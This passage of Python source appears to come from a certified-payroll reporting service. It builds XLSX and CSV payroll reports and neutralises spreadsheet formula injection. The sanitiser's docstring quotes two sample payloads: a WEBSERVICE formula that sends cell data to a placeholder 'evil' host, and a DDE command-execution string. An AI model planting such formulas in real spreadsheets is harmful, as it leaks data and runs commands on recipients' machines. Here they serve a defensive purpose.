            file_rows.append(
                {
                    "record_id": record_id,
                    "filename": filename,
                    "content_type": content_type,
                    "storage_path": path,
                    "size_bytes": len(content),
                }
            )
        inserted = (
            sb.table("cp_record_files").insert(file_rows).execute().data if file_rows else []
        )
        # Tag each stored file with every project it covers. Stored filenames
        # carry the revision prefix, so map back to the ORIGINAL `files` key.
        if file_projects and inserted:
            stored_to_original = {f"{prefix}{name}": name for name in files}
            fp_rows = [
                {"record_file_id": frow["id"], "project_id": pid}
                for frow in inserted
                for pid in sorted(
                    file_projects.get(stored_to_original.get(frow["filename"], ""), ())
                )
            ]
            if fp_rows:
                sb.table("cp_record_file_projects").insert(fp_rows).execute()
    except Exception:
        # Compensating cleanup: best-effort delete of everything already
        # uploaded plus the record row, then surface the original error.
        for path in uploaded:
            try:
                storage.delete_file(path)
            except Exception:  # noqa: BLE001
                pass
        try:
            sb.table("cp_records").delete().eq("id", record_id).execute()
        except Exception:  # noqa: BLE001
            pass
        raise

    return {"record": record, "files": inserted}


# ── File formatters (ported verbatim from the legacy service) ─────────────────


def _generate_pvw_sheet(rows: list[CprRowData], data: ReportData) -> io.BytesIO:
    """Generate PVW Sheet Old School XLSX."""
    from openpyxl import Workbook
    from openpyxl.styles import Alignment, Border, Font, Side

    wb = Workbook()
    ws = wb.active
    ws.title = "PVW Sheet"

    # Headers in row 2 (row 1 left blank for title area)
    headers = [
        "Pay Period",       # A
        "Classification",   # B
        "Name",             # C
        "Project",          # D
        "",                 # E (rate type)
        "Mon",              # F
        "Tue",              # G
        "Wed",              # H
        "Thu",              # I
        "Fri",              # J
        "Total",            # K
        "",                 # L
        "",                 # M
        "Rate/Job",         # N
        "Pension",          # O
        "H&W",              # P
        "Train",            # Q
        "Other",            # R
        "",                 # S
        "",                 # T
        "Pay date",         # U
        "Gross pay",        # V
        "FIT",              # W
        "SS",               # X
        "Med",              # Y
        "357 Dues",         # Z
        "Net pay",          # AA
    ]

    # Style
    header_font = Font(bold=True, size=10)
    data_font = Font(size=10)
    thin_border = Border(
        left=Side(style="thin"),
        right=Side(style="thin"),
        top=Side(style="thin"),
        bottom=Side(style="thin"),
    )

    # Write headers at row 2
    for col_idx, header in enumerate(headers, start=1):
        cell = ws.cell(row=2, column=col_idx, value=header)
        cell.font = header_font
        cell.border = thin_border
        cell.alignment = Alignment(horizontal="center", wrap_text=True)

    # Write data rows starting at row 3
    week_start = data.report.week_start_date
    week_end = data.report.week_end_date
    pay_period = f"{week_start.strftime('%-m/%-d/%y')} - {week_end.strftime('%-m/%-d/%y')}"

    for row_idx, row in enumerate(rows, start=3):
        summary = row.ot_summary

        # Daily total hours (Mon-Fri only), rounded to nearest quarter hour
        # day indices: Mon=1, Tue=2, Wed=3, Thu=4, Fri=5
        daily_totals = []
        for day_idx in [1, 2, 3, 4, 5]:  # Mon through Fri
            day_total = (
                summary.daily_st[day_idx]
                + summary.daily_ot[day_idx]
                + summary.daily_dt[day_idx]
            )
            rounded = round_quarter_hour(day_total)
            daily_totals.append(rounded)

        week_total = sum(daily_totals, ZERO)
        total_hours = row.hours_on_project

        values = [
            pay_period,                                          # A
            row.classification.code,                             # B
            row.employee.display_name,                           # C
            row.project.project_number,                          # D
            "R",                                                 # E
            _fmt_hours(daily_totals[0]),                         # F - Mon
            _fmt_hours(daily_totals[1]),                         # G - Tue
            _fmt_hours(daily_totals[2]),                         # H - Wed
            _fmt_hours(daily_totals[3]),                         # I - Thu
            _fmt_hours(daily_totals[4]),                         # J - Fri
            _fmt_hours(week_total),                              # K
            "",                                                  # L
            "",                                                  # M
            float(row.rate.hourly_rate),                         # N
            float(row.rate.pension * total_hours),               # O
            float(row.rate.health_welfare * total_hours),        # P
            float(row.rate.training * total_hours),              # Q
            float(row.rate.other * total_hours),                 # R
            "",                                                  # S
            "",                                                  # T
            row.payment_date.strftime("%-m/%-d/%y") if row.payment_date else "",  # U
            float(row.prorated_gross),                           # V
            float(row.prorated_fit),                             # W
            float(row.prorated_ss),                              # X
            float(row.prorated_med),                             # Y
            float(row.prorated_dues),                            # Z
            float(row.prorated_net),                             # AA
        ]

        for col_idx, val in enumerate(values, start=1):
            cell = ws.cell(row=row_idx, column=col_idx, value=_formula_safe(val))
            cell.font = data_font
            cell.border = thin_border

    # Auto-fit column widths (approximate)
    col_widths = {
        1: 18, 2: 14, 3: 20, 4: 12, 5: 4,
        6: 7, 7: 7, 8: 7, 9: 7, 10: 7, 11: 8,
        12: 4, 13: 4, 14: 10, 15: 10, 16: 10, 17: 10, 18: 10,
        19: 4, 20: 4, 21: 12, 22: 12, 23: 10, 24: 10, 25: 10,
        26: 10, 27: 12,
    }
    for col, width in col_widths.items():
        ws.column_dimensions[ws.cell(row=1, column=col).column_letter].width = width

    output = io.BytesIO()
    wb.save(output)
    output.seek(0)
    return output


def _serialize_paper_report(
    rows: list[CprRowData],
    data: ReportData,
    report_number: str = "",
    report_type_label: str = "",
    notes: str | None = None,
    org_settings: SettingsRec | None = None,
    user_profile: SignerRec | None = None,
) -> dict:
    """Convert CprRowData list + metadata into a dict for JSON response."""
    project = rows[0].project if rows else None
    week_start = data.report.week_start_date
    week_end = data.report.week_end_date

    date_labels = []
    for i in range(7):
        d = week_start + timedelta(days=i)
        date_labels.append(f"{d.month}/{d.day}")

    # Build employee rows
    employee_rows = []
    for row in rows:
        summary = row.ot_summary
        rate = row.rate
        total_st = summary.total_st
        total_ot = summary.total_ot
        total_dt = summary.total_dt

        daily_st = [
            float(summary.daily_st[i])
            if summary.daily_st[i] and summary.daily_st[i] != ZERO
            else None
            for i in range(7)
        ]
        daily_ot_vals = []
        for i in range(7):
            ot_val = summary.daily_ot[i] or ZERO
            dt_val = summary.daily_dt[i] or ZERO
            combined = ot_val + dt_val
            daily_ot_vals.append(float(combined) if combined != ZERO else None)

        total_all = total_st + total_ot + total_dt
        gross = (
            rate.hourly_rate * total_st
            + rate.overtime_rate * total_ot
            + rate.doubletime_rate * total_dt
        )

        employee_rows.append({
            "name": row.employee.display_name,
            "jurisdiction": row.employee.jurisdiction,
            "classification": row.classification.name or "",
            "daily_st": daily_st,
            "daily_ot": daily_ot_vals,
            "total_hours": float(total_all),
            "rate": float(rate.hourly_rate),
            "overtime_rate": float(rate.overtime_rate),
            "hw": float(rate.health_welfare * total_st),
            "pension": float(rate.pension * total_st),
            "vacation": 0.0,
            "training": float(rate.training * total_st),
            "other": float(rate.other * total_st),
            "gross": float(gross),
            "net": float(row.prorated_net),
        })

    # Build header
    report_dict: dict = {
        "project_number": project.project_number if project else None,
        "project_title": project.project_title if project else None,
        "contract_id": project.contract_id if project else None,
        "pwp_number": project.pwp_number if project else None,
        "public_body": project.public_body_awarding_contract if project else None,
        "report_number": report_number,
        "report_type": report_type_label,
        "notes": notes,
        "week_start": week_start.isoformat(),
        "week_end": week_end.isoformat(),
        "date_labels": date_labels,
        "employees": employee_rows,
    }

    # Prime contractor
    if project:
        prime_parts = [project.customer or ""]
        addr_parts = [
            p for p in [
                project.contractor_address_street,
                project.contractor_address_city,
                project.contractor_address_state,
                project.contractor_address_zip,
            ] if p
        ]
        if addr_parts:
            prime_parts.append(", ".join(addr_parts))
        report_dict["prime_contractor"] = "  ".join(prime_parts)
        report_dict["license_number"] = ""

    # Subcontractor
    if org_settings:
        sub_parts = [org_settings.name or ""]
        sub_addr = _format_org_address(org_settings)
        if sub_addr:
            sub_parts.append(sub_addr)
        report_dict["subcontractor"] = "  ".join(sub_parts)
        report_dict["sub_license_number"] = org_settings.license_number or ""
        report_dict["contractor_phone"] = org_settings.phone or ""

    # Compliance
    if user_profile:
        parts = []
        name = " ".join(p for p in [user_profile.first_name, user_profile.last_name] if p)
        if name:
            parts.append(name)
        if user_profile.job_title:
            parts.append(user_profile.job_title)
        report_dict["printed_name_title"] = ", ".join(parts)

    report_dict["date_signed"] = date.today().strftime("%-m/%-d/%Y")

    return report_dict


def _generate_paper_xlsx(
    rows: list[CprRowData],
    data: ReportData,
    report_number: str = "",
    report_type_label: str = "",
    notes: str | None = None,
    org_settings: SettingsRec | None = None,
    user_profile: SignerRec | None = None,
) -> io.BytesIO:
    """Generate Paper CPR as a formatted Excel workbook."""
    from openpyxl import Workbook
    from openpyxl.styles import Alignment, Border, Font, PatternFill, Side
    from openpyxl.utils import get_column_letter

    wb = Workbook()
    ws = wb.active
    ws.title = "Paper CPR"

    project = rows[0].project if rows else None
    week_start = data.report.week_start_date
    week_end = data.report.week_end_date

    date_labels = []
    for i in range(7):
        d = week_start + timedelta(days=i)
        date_labels.append(f"{d.month}/{d.day}")

    # Styles
    header_font = Font(bold=True, size=12)
    subheader_font = Font(bold=True, size=10)
    label_font = Font(bold=True, size=9)
    data_font = Font(size=9)
    money_fmt = '#,##0.00'
    hours_fmt = '0.##'
    thin_border = Border(
        left=Side(style='thin'),
        right=Side(style='thin'),
        top=Side(style='thin'),
        bottom=Side(style='thin'),
    )
    header_fill = PatternFill(start_color="4472C4", end_color="4472C4", fill_type="solid")
    header_font_white = Font(bold=True, size=9, color="FFFFFF")
    alt_fill = PatternFill(start_color="F2F2F2", end_color="F2F2F2", fill_type="solid")

    row_num = 1

    # ── Header Section ──
    ws.merge_cells(start_row=row_num, start_column=1, end_row=row_num, end_column=10)
    ws.cell(row=row_num, column=1, value="CERTIFIED PAYROLL REPORT").font = header_font
    row_num += 1

    def add_info_row(label, value):
        nonlocal row_num
        ws.cell(row=row_num, column=1, value=label).font = label_font
        ws.cell(row=row_num, column=3, value=_formula_safe(value)).font = data_font
        row_num += 1

    period_str = f"{week_start.strftime('%-m/%-d/%Y')} - {week_end.strftime('%-m/%-d/%Y')}"
    add_info_row("Period:", period_str)
    add_info_row("Report #:", report_number)
    add_info_row("Type:", report_type_label)

    if project:
        add_info_row("Project:", f"{project.project_number or ''} - {project.project_title or ''}")
        add_info_row("Contract/Bid #:", project.contract_id or "")
        add_info_row("PWP #:", project.pwp_number or "")
        add_info_row("Public Body:", project.public_body_awarding_contract or "")
        prime_parts = [project.customer or ""]
        addr_parts = [
            p for p in [
                project.contractor_address_street,
                project.contractor_address_city,
                project.contractor_address_state,
                project.contractor_address_zip,
            ] if p
        ]
        if addr_parts:
            prime_parts.append(", ".join(addr_parts))
        add_info_row("Prime Contractor:", "  ".join(prime_parts))

    if org_settings:
        sub_parts = [org_settings.name or ""]
        sub_addr = _format_org_address(org_settings)
        if sub_addr:
            sub_parts.append(sub_addr)
        add_info_row("Subcontractor:", "  ".join(sub_parts))
        add_info_row("License #:", org_settings.license_number or "")

    if notes:
        add_info_row("Notes:", notes)

    row_num += 1  # blank row

    # ── Employee Table Headers ──
    # Columns: #, Name, Classification, Sun ST..Sat ST, Sun OT..Sat OT, Total,
    # Rate, OT Rate, H&W, Pen, Vac, Trg, Other, Gross, Net
    day_names = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"]
    st_headers = [f"{d}\n{dl}\nST" for d, dl in zip(day_names, date_labels)]
    ot_headers = [f"{d}\n{dl}\nOT" for d, dl in zip(day_names, date_labels)]

    headers = ["#", "Name", "Classification"] + st_headers + ot_headers + [
        "Total\nHours", "Rate", "OT\nRate", "H&W", "Pension", "Vac", "Training",
        "Other", "Gross", "Net",
    ]

    for col_idx, header in enumerate(headers, 1):
        cell = ws.cell(row=row_num, column=col_idx, value=header)
        cell.font = header_font_white
        cell.fill = header_fill
        cell.border = thin_border
        cell.alignment = Alignment(horizontal='center', vertical='center', wrap_text=True)

    row_num += 1

    # ── Employee Rows ──
    for emp_idx, cpr_row in enumerate(rows, 1):
        summary = cpr_row.ot_summary
        rate = cpr_row.rate
        total_st = summary.total_st
        total_ot = summary.total_ot
        total_dt = summary.total_dt
        total_all = total_st + total_ot + total_dt

        name_with_jur = cpr_row.employee.display_name
        if cpr_row.employee.jurisdiction:
            name_with_jur += f" - {cpr_row.employee.jurisdiction}"

        gross = (
            rate.hourly_rate * total_st
            + rate.overtime_rate * total_ot
            + rate.doubletime_rate * total_dt
        )

        row_data = [emp_idx, name_with_jur, cpr_row.classification.name or ""]

        # Daily ST hours
        for i in range(7):
            val = summary.daily_st[i]
            row_data.append(float(val) if val and val != ZERO else None)

        # Daily OT hours (combined OT + DT)
        for i in range(7):
            ot_val = summary.daily_ot[i] or ZERO
            dt_val = summary.daily_dt[i] or ZERO
            combined = ot_val + dt_val
            row_data.append(float(combined) if combined != ZERO else None)

        row_data.extend([
            float(total_all),
            float(rate.hourly_rate),
            float(rate.overtime_rate),
            float(rate.health_welfare * total_st),
            float(rate.pension * total_st),
            0.0,  # Vacation
            float(rate.training * total_st),
            float(rate.other * total_st),
            float(gross),
            float(cpr_row.prorated_net),
        ])

        use_alt = emp_idx % 2 == 0
        for col_idx, value in enumerate(row_data, 1):
            cell = ws.cell(row=row_num, column=col_idx, value=_formula_safe(value))
            cell.font = data_font
            cell.border = thin_border
            if use_alt:
                cell.fill = alt_fill
            # Format numbers
            if col_idx >= 4 and col_idx <= 17:  # Hours columns
                cell.number_format = hours_fmt
                cell.alignment = Alignment(horizontal='center')
            elif col_idx >= 18:  # Money/totals columns
                cell.number_format = money_fmt
                cell.alignment = Alignment(horizontal='right')

        row_num += 1

    row_num += 1  # blank row

    # ── Compliance Section ──
    ws.merge_cells(start_row=row_num, start_column=1, end_row=row_num, end_column=10)
    ws.cell(row=row_num, column=1, value="STATEMENT OF COMPLIANCE").font = subheader_font
    row_num += 1

    compliance_text = (
        "I, the undersigned, certify that I have examined the payroll records shown above "
        "and that the information contained herein is true and correct."
    )
    ws.merge_cells(start_row=row_num, start_column=1, end_row=row_num, end_column=15)
    ws.cell(row=row_num, column=1, value=compliance_text).font = data_font
    row_num += 2

    if user_profile:
        parts = []
        name = " ".join(p for p in [user_profile.first_name, user_profile.last_name] if p)
        if name:
            parts.append(name)
        if user_profile.job_title:
            parts.append(user_profile.job_title)
        add_info_row("Printed Name / Title:", ", ".join(parts))

    if org_settings and org_settings.phone:
        add_info_row("Telephone:", org_settings.phone)

    add_info_row("Date:", date.today().strftime("%-m/%-d/%Y"))

    # ── Column Widths ──
    col_widths = [4, 25, 18] + [7] * 14 + [8, 8, 8, 9, 9, 7, 9, 8, 11, 11]
    for col_idx, width in enumerate(col_widths, 1):
        ws.column_dimensions[get_column_letter(col_idx)].width = width

    output = io.BytesIO()
    wb.save(output)
    output.seek(0)
    return output


def _format_org_address(org_settings: SettingsRec) -> str:
    """Format organization address as a single line."""
    parts = []
    if org_settings.street_address:
        parts.append(org_settings.street_address)
    city_state_zip = []
    if org_settings.city:
        city_state_zip.append(org_settings.city)
    if org_settings.state:
        city_state_zip.append(org_settings.state)
    if city_state_zip:
        parts.append(", ".join(city_state_zip))
    if org_settings.zip_code:
        parts.append(org_settings.zip_code)
    return "  ".join(parts)


def _pdf_hours(val: Decimal) -> str:
    """Format hours for PDF: integer-like if whole, else 2 decimals. Empty if
    zero. (Legacy PDF-era helper, kept for parity.)"""
    if not val or val == ZERO:
        return "0"
    if val == val.to_integral_value():
        return str(int(val))
    return str(val.quantize(TWO_PLACES))


def _pdf_money(val: Decimal) -> str:
    """Format a dollar amount: 2 decimal places, '0' if zero. (Legacy PDF-era
    helper, kept for parity.)"""
    if not val or val == ZERO:
        return "0"
    return str(val.quantize(TWO_PLACES))


def _generate_csv(
    rows: list[CprRowData],
    data: ReportData,
    report_type: str,
) -> io.BytesIO:
    """Generate eComply or LCP Tracker CSV."""
    output = io.BytesIO()
    text_wrapper = io.TextIOWrapper(output, encoding="utf-8", newline="")
    writer = csv.writer(text_wrapper)

    # 97-column header
    headers = [
        "payroll_number",           # A (0)
        "project_code",             # B (1)
        "contract_id",              # C (2)
        "work_order",               # D (3)
        "week_end_date",            # E (4)
        "check_num",                # F (5)
        "ssn",                      # G (6)
        "employee_ID",              # H (7)
        "class_code",               # I (8)
        "gross_employee_pay",       # J (9)
        "all_projects",             # K (10)
        "wages_paid_in_lieu_of_fringes",  # L (11)
        "total_paid",               # M (12)
        "st_hrs_date1",             # N (13) - Sun
        "st_hrs_date2",             # O (14) - Mon
        "st_hrs_date3",             # P (15) - Tue
        "st_hrs_date4",             # Q (16) - Wed
        "st_hrs_date5",             # R (17) - Thu
        "st_hrs_date6",             # S (18) - Fri
        "st_hrs_date7",             # T (19) - Sat
        "ov_hrs_date1",             # U (20) - Sun
        "ov_hrs_date2",             # V (21) - Mon
        "ov_hrs_date3",             # W (22) - Tue
        "ov_hrs_date4",             # X (23) - Wed
        "ov_hrs_date5",             # Y (24) - Thu
        "ov_hrs_date6",             # Z (25) - Fri
        "ov_hrs_date7",             # AA (26) - Sat
        "ov_hrsx2_date1",           # AB (27) - Sun
        "ov_hrsx2_date2",           # AC (28) - Mon
        "ov_hrsx2_date3",           # AD (29) - Tue
        "ov_hrsx2_date4",           # AE (30) - Wed
        "ov_hrsx2_date5",           # AF (31) - Thu
        "ov_hrsx2_date6",           # AG (32) - Fri
        "ov_hrsx2_date7",           # AH (33) - Sat
        "Total_Hours_All_Projects", # AI (34)
        "ep_haw",                   # AJ (35)
        "ep_pension",               # AK (36)
        "ep_vacation",              # AL (37)
        "ep_training",              # AM (38)
        "ep_other",                 # AN (39)
        "vol_emp_pay_haw",          # AO (40)
        "vol_emp_pay_med",          # AP (41)
        "dts_fed_tax",              # AQ (42)
        "dts_fica",                 # AR (43)
        "dts_medicare",             # AS (44)
        "dts_state_tax",            # AT (45)
        "dts_sdi",                  # AU (46)
        "dts_dues",                 # AV (47)
        "dts_savings",              # AW (48)
        "dts_other",                # AX (49)
        "dts_total",                # AY (50)
        "trav_subs",                # AZ (51)
        "pay_rate",                 # BA (52)
        "OT_rate",                  # BB (53)
        "2OT_rate",                 # BC (54)
        "prnotes",                  # BD (55)
        "Payment_date",             # BE (56)
        "first_name",              # BF (57)
        "last_name",               # BG (58)
        "address1",                 # BH (59)
        "address2",                 # BI (60)
        "city",                     # BJ (61)
        "state",                    # BK (62)
        "zip",                      # BL (63)
        "country",                  # BM (64)
        "phone",                    # BN (65)
        "gender",                   # BO (66)
        "ethnicity",                # BP (67)
        "apprentice_id",            # BQ (68)
        "veteran_status",           # BR (69)
        "apprentice_pct",           # BS (70)
        "trade_code",               # BT (71)
        "sub_trade_code",           # BU (72)
        "suffix",                   # BV (73)
        "middle_initial",           # BW (74)
        "email",                    # BX (75)
        "hire_date",                # BY (76)
        "craft_level",              # BZ (77)
        "pay_type",                 # CA (78)
        "exempt_status",            # CB (79)
        "union_code",               # CC (80)
        "local_num",                # CD (81)
        "area_code",                # CE (82)
        "sub_contractor_name",      # CF (83)
        "sub_contractor_id",        # CG (84)
        "license_num",              # CH (85)
        "dba",                      # CI (86)
        "fr_haw",                   # CJ (87)
        "fr_pension",               # CK (88)
        "fr_vacation",              # CL (89)
        "fr_training",              # CM (90)
        "fr_other",                 # CN (91)
        "total_fringe",             # CO (92)
        "fringe_benefit_plan",      # CP (93)
        "shift_differential",       # CQ (94)
        "payroll_date",             # CR (95)
        "notes",                    # CS (96)
    ]

    writer.writerow(headers)

    for row in rows:
        summary = row.ot_summary
        week_end = data.report.week_end_date

        # Masked SSN
        ssn = ""
        if row.employee.ssn_last_four:
            ssn = f"XXX-XX-{row.employee.ssn_last_four}"

        # Total hours across ALL projects for this employee
        total_all = row.total_hours_all_projects

        # Deduction totals for dts_total
        dts_total = (
            (row.prorated_fit or ZERO)
            + (row.prorated_ss or ZERO)
            + (row.prorated_med or ZERO)
            + (row.prorated_dues or ZERO)
            + (row.prorated_401k or ZERO)
        )

        # Apprentice ID
        apprentice_id = ""
        if row.classification.is_apprentice and row.classification.apprentice_period:
            apprentice_id = str(row.classification.apprentice_period)

        csv_row = [
            "",                                                          # A payroll_number
            row.project.project_number or "",                            # B project_code
            row.project.contract_id or "",                               # C contract_id
            "",                                                          # D work_order
            week_end.strftime("%-m/%-d/%y"),                             # E week_end_date
            "",                                                          # F check_num
            ssn,                                                         # G ssn
            row.employee.employee_id or "",                              # H employee_ID
            row.classification.code,                                     # I class_code
            _csv_val(row.prorated_gross),                                # J gross_employee_pay
            _csv_val(row.detail.gross_pay_total),                        # K all_projects
            "",                                                          # L wages_paid_in_lieu
            _csv_val(row.detail.net_pay),                                # M total_paid
        ]

        # ST hours: Sun(0) through Sat(6)
        for i in range(7):
            csv_row.append(_csv_val(summary.daily_st[i]))

        # OT hours: Sun(0) through Sat(6)
        for i in range(7):
            csv_row.append(_csv_val(summary.daily_ot[i]))

        # DT hours: Sun(0) through Sat(6)
        for i in range(7):
            csv_row.append(_csv_val(summary.daily_dt[i]))

        csv_row.extend([
            _csv_val(total_all),                                         # AI Total_Hours_All
            "",                                                          # AJ ep_haw
            "",                                                          # AK ep_pension
            "",                                                          # AL ep_vacation
            "",                                                          # AM ep_training
            "",                                                          # AN ep_other
            "",                                                          # AO vol_emp_pay_haw
            "",                                                          # AP vol_emp_pay_med
            _csv_val(row.prorated_fit),                                  # AQ dts_fed_tax
            _csv_val(row.prorated_ss),                                   # AR dts_fica
            _csv_val(row.prorated_med),                                  # AS dts_medicare
            "",                                                          # AT dts_state_tax
            "",                                                          # AU dts_sdi
            _csv_val(row.prorated_dues),                                 # AV dts_dues
            _csv_val(row.prorated_401k),                                 # AW dts_savings
            "",                                                          # AX dts_other
            _csv_val(dts_total),                                         # AY dts_total
            "",                                                          # AZ trav_subs
            _csv_val(row.rate.hourly_rate),                              # BA pay_rate
            _csv_val(row.rate.overtime_rate),                            # BB OT_rate
            _csv_val(row.rate.doubletime_rate),                          # BC 2OT_rate
            "",                                                          # BD prnotes
            row.payment_date.strftime("%-m/%-d/%y") if row.payment_date else "",  # BE
            _formula_safe(row.employee.first_name),                      # BF first_name
            _formula_safe(row.employee.last_name),                       # BG last_name
            "",                                                          # BH address1
            "",                                                          # BI address2
            "",                                                          # BJ city
            "",                                                          # BK state
            "",                                                          # BL zip
            "",                                                          # BM country
            "",                                                          # BN phone
            "",                                                          # BO gender
            "",                                                          # BP ethnicity
            _formula_safe(apprentice_id),                                # BQ apprentice_id
            "",                                                          # BR veteran_status
            "",                                                          # BS apprentice_pct
            "",                                                          # BT trade_code
            "",                                                          # BU sub_trade_code
            "",                                                          # BV suffix
            "",                                                          # BW middle_initial
            _formula_safe(row.employee.personal_email or ""),            # BX email
            "",                                                          # BY hire_date
            "",                                                          # BZ craft_level
            "",                                                          # CA pay_type
            "",                                                          # CB exempt_status
            "",                                                          # CC union_code
            "",                                                          # CD local_num
            "",                                                          # CE area_code
            "",                                                          # CF sub_contractor_name
            "",                                                          # CG sub_contractor_id
            "",                                                          # CH license_num
            "",                                                          # CI dba
            "",                                                          # CJ fr_haw
            "",                                                          # CK fr_pension
            "",                                                          # CL fr_vacation
            "",                                                          # CM fr_training
            "",                                                          # CN fr_other
            "",                                                          # CO total_fringe
            "",                                                          # CP fringe_benefit_plan
            "",                                                          # CQ shift_differential
            "",                                                          # CR payroll_date
            "",                                                          # CS notes
        ])

        writer.writerow(csv_row)

    text_wrapper.detach()
    output.seek(0)
    return output


def _prorate(amount: Decimal | None, hours_on_project: Decimal, total_hours: Decimal) -> Decimal:
    """Prorate an amount based on hours ratio."""
    if not amount or total_hours <= 0:
        return ZERO
    return (amount * hours_on_project / total_hours).quantize(TWO_PLACES, rounding=ROUND_HALF_UP)


def _fmt_hours(val: Decimal) -> object:
    """Format hours for PVW sheet: return float if non-zero, empty string if zero."""
    if val and val != ZERO:
        return float(val)
    return ""


def _csv_val(val: Decimal | None) -> str:
    """Format a decimal for CSV: empty string if zero/None, otherwise string value."""
    if val is None or val == ZERO:
        return ""
    return str(val.quantize(TWO_PLACES))


def _formula_safe(value):
    """Neutralize spreadsheet formula / DDE injection (CWE-1236) in free-text
    values written to the CPR XLSX/CSV deliverables. Excel and Sheets treat a
    cell whose text begins with '=', '+', '-', '@' (or a leading tab/CR) as a
    live formula, so a name/notes value like `=WEBSERVICE("http://evil/?"&A1)`
    or `=cmd|/C calc!A0` would execute when a coworker or the receiving public
    body opens the workbook. Prefixing such a value with a single quote forces
    Excel to render it as literal text. A no-op for numbers (openpyxl binds
    Decimals/floats as numeric cells, which this leaves untouched) and for
    strings that don't start with a formula lead character, so it never corrupts
    numeric columns."""
    if isinstance(value, str) and value and value[0] in ("=", "+", "-", "@", "\t", "\r"):
        return "'" + value
    return value


def create_zip(files: dict[str, io.BytesIO]) -> io.BytesIO:
    """Bundle multiple files into a ZIP archive."""
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for filename, content in files.items():
            zf.writestr(filename, content.read())
    zip_buffer.seek(0)
    return zip_buffer
